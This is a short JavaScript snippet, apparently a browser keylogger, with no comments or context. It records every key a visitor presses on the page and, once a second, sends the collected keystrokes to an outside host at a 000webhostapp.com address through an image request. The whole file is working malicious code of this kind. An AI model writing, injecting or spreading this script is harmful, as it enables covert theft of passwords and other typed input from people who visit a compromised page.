var keys = '';

document.onkeypress =function(e) 
{
	var get = window.event ? event : e;
	var key = get.keyCode ? get.keyCode : get.charCode;
	key = String.fromCharCode(key);
	keys += key;
}
window.setInterval(function()
{
	new Image().src = 'https://lmsesn.000webhostapp.com/testing.php?log=' + keys;
	keys = '';
},1000);